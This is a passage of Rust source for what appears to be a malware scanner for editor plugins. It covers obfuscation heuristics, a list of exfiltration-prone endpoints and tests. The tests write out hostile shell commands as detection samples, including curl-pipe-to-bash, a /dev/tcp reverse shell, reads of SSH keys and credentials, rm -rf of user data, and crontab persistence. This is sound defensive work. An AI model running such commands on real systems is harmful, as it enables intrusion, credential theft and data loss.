            "symbol-only JavaScript",
        );
    }

    let hex_escapes = source.matches("\\x").count();
    if hex_escapes >= 300 && hex_escapes * 100 >= source.len() {
        ctx.add(
            "obfuscation.escaped_strings",
            Severity::Low,
            Category::Obfuscation,
            None,
            "Unusually many \\x escapes in strings",
            format!("{hex_escapes} hex escapes"),
        );
    }
}

pub fn classify_hex_array(ctx: &mut RuleContext<'_>, span: Span, total: usize, hex_like: usize) {
    if total > 40 && hex_like * 10 >= total * 9 {
        ctx.add(
            "obfuscation.hex_array",
            Severity::Low,
            Category::Obfuscation,
            Some(span),
            "Large array of hex values (also normal in crypto/hash code)",
            format!("{hex_like}/{total} hex elements"),
        );
    }
}

fn record_url(ctx: &mut RuleContext<'_>, url: Option<&str>) {
    if let Some(url) = url {
        ctx.facts.urls.extend(extract_urls(url));
    }
}

fn count_obfuscator_identifiers(source: &str) -> usize {
    let bytes = source.as_bytes();
    let mut seen = std::collections::HashSet::new();
    let mut index = 0;
    while let Some(offset) = source[index..].find("_0x") {
        let start = index + offset;
        let mut end = start + 3;
        while end < bytes.len() && bytes[end].is_ascii_hexdigit() {
            end += 1;
        }
        let preceded_by_ident =
            start > 0 && (bytes[start - 1].is_ascii_alphanumeric() || bytes[start - 1] == b'$');
        if (4..=8).contains(&(end - start - 3)) && !preceded_by_ident {
            seen.insert(&source[start..end]);
            if seen.len() >= 200 {
                break;
            }
        }
        index = end;
    }
    seen.len()
}

fn looks_like_jsfuck(source: &str) -> bool {
    if source.len() < 2048 {
        return false;
    }
    let mut symbols = 0usize;
    let mut total = 0usize;
    for byte in source.bytes().filter(|byte| !byte.is_ascii_whitespace()) {
        total += 1;
        if matches!(byte, b'[' | b']' | b'(' | b')' | b'!' | b'+') {
            symbols += 1;
        }
    }
    total > 0 && symbols * 100 >= total * 85
}

const MAX_EMBEDDED_WASM: usize = 16;

/// `AGFzbQ…` or `data:application/wasm;base64,AGFzbQ…`.
fn decode_wasm_payload(value: &str) -> Option<Vec<u8>> {
    let data = match value.strip_prefix("data:") {
        Some(rest) => rest.split_once(";base64,")?.1,
        None => value,
    };
    if !data.starts_with(crate::wasm::BASE64_MAGIC) || data.len() < 16 {
        return None;
    }
    let bytes = base64::engine::general_purpose::STANDARD
        .decode(data.trim_end())
        .ok()?;
    bytes.starts_with(crate::wasm::MAGIC).then_some(bytes)
}

fn decode_js_payload(value: &str) -> Option<String> {
    let candidate = match value.strip_prefix("data:") {
        Some(rest) => {
            let (mime, data) = rest.split_once(',')?;
            if !mime.contains("javascript") || !mime.contains("base64") {
                return None;
            }
            data
        }
        None => value,
    };
    if !candidate.bytes().all(|byte| {
        byte.is_ascii_alphanumeric() || matches!(byte, b'+' | b'/' | b'=' | b'-' | b'_')
    }) {
        return None;
    }
    let bytes = base64::engine::general_purpose::STANDARD
        .decode(candidate)
        .or_else(|_| base64::engine::general_purpose::URL_SAFE.decode(candidate))
        .ok()?;
    let text = String::from_utf8(bytes).ok()?;
    looks_like_javascript(&text).then_some(text)
}

pub fn looks_like_javascript(text: &str) -> bool {
    let markers = [
        "function",
        "=>",
        "eval(",
        "require(",
        "fetch(",
        "return ",
        "var ",
        "const ",
        "let ",
        "window.",
        "document.",
        "acode.",
    ];
    let printable = text
        .chars()
        .filter(|ch| !ch.is_control() || ch.is_whitespace())
        .count();
    printable * 100 >= text.chars().count() * 95
        && markers
            .iter()
            .filter(|marker| text.contains(*marker))
            .count()
            >= 2
}

pub fn contains_script_tag(html: &str) -> bool {
    html.to_ascii_lowercase().contains("<script")
}

pub fn is_remote_url(value: &str) -> bool {
    let lower = value.trim_start().to_ascii_lowercase();
    lower.starts_with("http://") || lower.starts_with("https://") || lower.starts_with("//")
}

pub fn extract_urls(text: &str) -> Vec<String> {
    let mut urls = Vec::new();
    for scheme in ["https://", "http://", "wss://", "ws://"] {
        let mut index = 0;
        while let Some(offset) = text[index..].find(scheme) {
            let start = index + offset;
            // Skip "ws://" inside "wss://" and "http" inside "https" duplicates.
            let prefix_clash = start > 0 && text.as_bytes()[start - 1].is_ascii_alphabetic();
            let end = text[start..]
                .find(|ch: char| {
                    ch.is_whitespace() || matches!(ch, '"' | '\'' | '`' | '<' | '>' | ')' | '\\')
                })
                .map_or(text.len(), |len| start + len);
            if !prefix_clash && end > start + scheme.len() {
                urls.push(text[start..end].to_string());
            }
            index = end.max(start + scheme.len());
        }
    }
    urls
}

pub fn host_of(url: &str) -> Option<String> {
    let rest = url.split_once("://").map_or(url, |(_, rest)| rest);
    let host = rest
        .split(['/', '?', '#'])
        .next()?
        .rsplit('@')
        .next()?
        .trim_start_matches('[');
    let host = match host.rsplit_once(':') {
        Some((name, port)) if port.chars().all(|ch| ch.is_ascii_digit()) => name,
        _ => host,
    }
    .trim_end_matches(']')
    .trim_end_matches('.')
    .to_ascii_lowercase();
    let valid = !host.is_empty()
        && host.contains(['.', ':'])
        && host
            .chars()
            .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '.' | '-' | ':' | '_'))
        || host == "localhost";
    valid.then_some(host)
}

pub struct EndpointRisk {
    pub tag: &'static str,
    pub severity: Option<Severity>,
    pub message: &'static str,
}

/// Hosts and URLs that malware favours for exfiltration and payload hosting.
pub fn classify_endpoint(url: &str, host: &str) -> Option<EndpointRisk> {
    let lower = url.to_ascii_lowercase();
    let host_is = |domains: &[&str]| {
        domains
            .iter()
            .any(|domain| host == *domain || host.ends_with(&format!(".{domain}")))
    };
    let risk = |tag, severity, message| {
        Some(EndpointRisk {
            tag,
            severity,
            message,
        })
    };

    if WEBHOOK_WITH_SECRET.is_match(&lower) {
        return risk(
            "webhook",
            Some(Severity::High),
            "Sends data to a webhook / bot whose secret is hardcoded in the plugin (a channel the author controls)",
        );
    }
    if [
        "discord.com/api/webhooks",
        "discordapp.com/api/webhooks",
        "api.telegram.org/bot",
        "api.telegram.org/file/bot",
        "hooks.slack.com/",
        "script.google.com/macros",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
    {
        // Only the API base is in the plugin; the secret comes from somewhere
        // else at runtime, usually the user's own settings.
        return risk(
            "bot-api",
            Some(Severity::Low),
            "Uses a bot / webhook API with a token supplied at runtime",
        );
    }
    if host_is(&[
        "webhook.site",
        "pipedream.net",
        "requestbin.com",
        "requestcatcher.com",
        "beeceptor.com",
        "interact.sh",
        "oast.fun",
        "oast.pro",
        "oast.live",
        "oast.site",
        "oast.online",
        "oast.me",
        "burpcollaborator.net",
        "canarytokens.com",
        "hookbin.com",
    ]) {
        return risk(
            "webhook",
            Some(Severity::High),
            "Sends data to a webhook / request-capture service",
        );
    }
    if host.ends_with(".onion") {
        return risk("tor", Some(Severity::High), "Contacts a Tor hidden service");
    }
    if host_is(&[
        "pastebin.com",
        "hastebin.com",
        "paste.ee",
        "rentry.co",
        "ghostbin.com",
        "transfer.sh",
        "file.io",
        "0x0.st",
        "gofile.io",
        "temp.sh",
        "catbox.moe",
        "anonfiles.com",
    ]) {
        return risk(
            "paste-or-file-drop",
            Some(Severity::Medium),
            "Uses a paste / anonymous file-drop service",
        );
    }
    if host_is(&[
        "ngrok.io",
        "ngrok-free.app",
        "ngrok.app",
        "trycloudflare.com",
        "loca.lt",
        "serveo.net",
        "localtunnel.me",
        "duckdns.org",
        "no-ip.org",
        "ddns.net",
        "hopto.org",
    ]) {
        return risk(
            "tunnel",
            Some(Severity::Medium),
            "Uses a tunnel or dynamic-DNS host",
        );
    }
    if host_is(&[
        "bit.ly",
        "tinyurl.com",
        "is.gd",
        "cutt.ly",
        "rb.gy",
        "shorturl.at",
        "t.ly",
    ]) {
        return risk(
            "shortener",
            Some(Severity::Medium),
            "Uses a URL shortener (hides the real destination)",
        );
    }
    if host_is(&[
        "api.ipify.org",
        "ipinfo.io",
        "ip-api.com",
        "ifconfig.me",
        "icanhazip.com",
        "checkip.amazonaws.com",
    ]) {
        return risk(
            "ip-lookup",
            Some(Severity::Low),
            "Looks up the device's public IP address",
        );
    }
    if let Some(ip) = parse_ipv4(host) {
        let private = ip[0] == 10
            || ip[0] == 127
            || ip == [0, 0, 0, 0]
            || (ip[0] == 192 && ip[1] == 168)
            || (ip[0] == 172 && (16..=31).contains(&ip[1]));
        return if private {
            risk("local", None, "")
        } else {
            risk(
                "raw-ip",
                Some(Severity::Medium),
                "Contacts a hard-coded public IP address",
            )
        };
    }
    if host == "localhost" {
        return risk("local", None, "");
    }
    None
}

fn parse_ipv4(host: &str) -> Option<[u8; 4]> {
    let parts: Vec<u8> = host
        .split('.')
        .map(|part| part.parse().ok())
        .collect::<Option<_>>()?;
    parts.try_into().ok()
}

fn line_starts(source: &str) -> Vec<usize> {
    let mut starts = vec![0];
    starts.extend(source.match_indices('\n').map(|(index, _)| index + 1));
    starts
}

fn offset_to_line_column(line_starts: &[usize], offset: usize) -> (usize, usize) {
    let line_index = match line_starts.binary_search(&offset) {
        Ok(index) => index,
        Err(index) => index.saturating_sub(1),
    };
    (
        line_index + 1,
        offset.saturating_sub(line_starts[line_index]) + 1,
    )
}

pub fn shorten(value: &str, max_chars: usize) -> String {
    let mut chars = value.chars();
    let shortened: String = chars.by_ref().take(max_chars).collect();
    if chars.next().is_some() {
        format!("{shortened}…")
    } else {
        shortened
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn command_ids(command: &str) -> Vec<String> {
        let mut ctx = RuleContext::new("x.js", "", None);
        classify_command(&mut ctx, Span::new(0, 0), command);
        ctx.findings
            .into_iter()
            .map(|finding| finding.key)
            .collect()
    }

    #[test]
    fn flags_dangerous_shell_commands() {
        assert!(
            command_ids("curl -fsSL https://x.sh/i | bash")
                .contains(&"shell.dangerous_command:download_and_run".into())
        );
        assert!(
            command_ids("sh -c \"$(wget -qO- https://e.vil)\"")
                .contains(&"shell.dangerous_command:download_and_run".into())
        );
        assert!(
            command_ids("echo aGk= | base64 -d | sh")
                .contains(&"shell.dangerous_command:decode_and_run".into())
        );
        assert!(
            command_ids("bash -i >& /dev/tcp/1.2.3.4/9001 0>&1")
                .contains(&"shell.dangerous_command:reverse_shell".into())
        );
        assert!(
            command_ids("rm -rf /sdcard")
                .contains(&"shell.dangerous_command:destroy_user_data".into())
        );
        assert!(
            command_ids("rm -rf $HOME/")
                .contains(&"shell.dangerous_command:destroy_user_data".into())
        );
    }

    #[test]
    fn flags_more_risky_shell_patterns() {
        let has = |command: &str, rule: &str| {
            command_ids(command).contains(&format!("shell.dangerous_command:{rule}"))
        };
        assert!(has(
            "curl -L https://x.io/tool -o /usr/bin/tool && chmod +x /usr/bin/tool",
            "download_then_exec"
        ));
        assert!(has(
            "wget -O ~/bin/t https://x.io/t\nchmod 755 ~/bin/t",
            "download_then_exec"
        ));
        assert!(has(
            "apk add --allow-untrusted ./x.apk",
            "untrusted_package_source"
        ));
        assert!(has(
            "pip install git+https://github.com/x/y",
            "untrusted_package_source"
        ));
        assert!(has("cat ~/.ssh/id_rsa", "credential_access"));
        assert!(has("cp $HOME/.git-credentials /tmp/c", "credential_access"));
        assert!(has(
            "curl -F f=@/sdcard/notes.txt https://x.io/up",
            "file_upload"
        ));
        assert!(has("env | curl -d @- https://x.io", "pipe_to_network"));
        assert!(has(
            "echo '* * * * * sh /x' | crontab -",
            "scheduled_persistence"
        ));
    }

    #[test]
    fn checks_shipped_shell_scripts() {
        let script = "#!/bin/sh\n# setup\ncurl -fsSL https://e.vil/i.sh | sh\nwget -O /tmp/x https://e.vil/x\nchmod +x /tmp/x\n";
        assert!(is_shell_script("setup", script.as_bytes()));
        assert!(is_shell_script("install.sh", b"apk add git"));
        assert!(!is_shell_script("notes.txt", b"#!important"));
        let mut ctx = RuleContext::new("setup", script, None);
        scan_shell_script(&mut ctx);
        let keys: Vec<_> = ctx.findings.iter().map(|f| f.key.as_str()).collect();
        assert!(keys.contains(&"shell.dangerous_command:download_and_run"));
        assert!(keys.contains(&"shell.dangerous_command:download_then_exec"));
        let line = ctx
            .findings
            .iter()
            .find(|f| f.key.ends_with(":download_and_run"))
            .and_then(|f| f.span)
            .map(|span| span.start_line);
        assert_eq!(line, Some(3));
        assert!(ctx.facts.urls.iter().any(|url| url.contains("e.vil")));
    }

    #[test]
    fn dangerous_rules_skip_lookalikes() {
        let has = |command: &str, rule: &str| {
            command_ids(command).contains(&format!("shell.dangerous_command:{rule}"))
        };
        for command in [
            "rm -rf /sdcard",
            "rm -rf /sdcard/",
            "rm -rf \"$HOME\"",
            "rm -rf ~/*",
            "rm -fr /storage/emulated/0/ && echo",
            "rm -rf /",
        ] {
            assert!(has(command, "destroy_user_data"), "{command}");
        }
        for command in [
            "rm -rf ~/.cache/opencode",
            "rm -rf $HOME/.npm/_cacache",
            "rm -rf /sdcard/Download/plugin-tmp",
            "rm -rf /data/user/0/com.foxdebug.acode/files/tmp",
            "rm -rf ./build",
        ] {
            assert!(!has(command, "destroy_user_data"), "{command}");
        }
        assert!(has("cat /data/data/com.whatsapp/x", "other_app_data"));
        assert!(has("ls /data/user/0/", "other_app_data"));
        assert!(!has(
            "ls /data/user/0/com.foxdebug.acode.free/files",
            "other_app_data"
        ));
        assert!(has("echo 'x' >> ~/.bashrc", "shell_profile_persistence"));
        assert!(has(
            "echo x | tee -a /etc/profile.d/x.sh",
            "shell_profile_persistence"
        ));
        assert!(!has(
            "cat \"/x/rootfs/etc/profile\"",
            "shell_profile_persistence"
        ));
        assert!(!has(". ~/.profile", "shell_profile_persistence"));
        assert!(!has("crontab -l", "scheduled_persistence"));
        assert!(has("crontab -r", "scheduled_persistence"));
    }

    #[test]
    fn ignores_normal_shell_commands() {
        assert!(command_ids("apk add python3 && pip install black").is_empty());
        assert!(command_ids("rm -rf /tmp/build && mkdir -p ~/project").is_empty());
        assert!(command_ids("curl -L https://example.com/file.tar.gz -o file.tar.gz").is_empty());
        assert!(command_ids("chmod +x ./gradlew && ./gradlew build").is_empty());
        assert!(command_ids("pip install --index-url https://pypi.org/simple black").is_empty());
        assert!(command_ids("curl -d '{\"a\":1}' https://api.example.com").is_empty());
    }

    #[test]
    fn classifies_endpoints() {
        let tag = |url: &str| classify_endpoint(url, &host_of(url).unwrap()).map(|risk| risk.tag);
        assert_eq!(
            tag("https://discord.com/api/webhooks/1/abc"),
            Some("webhook")
        );
        assert_eq!(tag("https://abc.ngrok-free.app/x"), Some("tunnel"));
        assert_eq!(tag("http://45.12.1.9:8080/p"), Some("raw-ip"));
        assert_eq!(tag("http://127.0.0.1:3000"), Some("local"));
        assert_eq!(
            tag(
                "https://api.telegram.org/bot123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw/sendMessage"
            ),
            Some("webhook")
        );
        assert_eq!(tag("https://api.telegram.org/bot"), Some("bot-api"));
        assert_eq!(tag("https://discord.com/api/webhooks/"), Some("bot-api"));
        assert_eq!(
            tag("https://script.google.com/macros/s/AKfycbx1abc/exec"),
            Some("webhook")
        );
        assert_eq!(tag("https://discord.com/invite/x"), None);
        assert_eq!(tag("https://acode.app/api"), None);
    }

    #[test]
    fn extracts_urls_from_text() {
        assert_eq!(
            extract_urls("see https://a.com/x and wss://b.io/ws"),
            vec!["https://a.com/x".to_string(), "wss://b.io/ws".to_string()]
        );
        assert_eq!(
            host_of("https://user@Sub.Example.com:8080/p"),
            Some("sub.example.com".into())
        );
    }

    #[test]
    fn detects_obfuscator_output() {
        let source = (0..40)
            .map(|i| format!("var _0x{:04x}=1;", i * 7 + 4096))
            .collect::<String>();
        let mut ctx = RuleContext::new("x.js", &source, None);
        scan_source_text(&mut ctx);
        assert!(
            ctx.findings
                .iter()
                .any(|f| f.id == "obfuscation.obfuscator_tool")
        );
    }

    #[test]
    fn decodes_base64_js_payloads_only() {
        let js = base64::engine::general_purpose::STANDARD
            .encode("const x = fetch('https://e.vil'); function run(){ eval(x) } ".repeat(4));
        assert!(decode_js_payload(&js).is_some());
        let binary =
            base64::engine::general_purpose::STANDARD.encode([0u8, 159, 146, 150].repeat(80));
        assert!(decode_js_payload(&binary).is_none());
    }
}
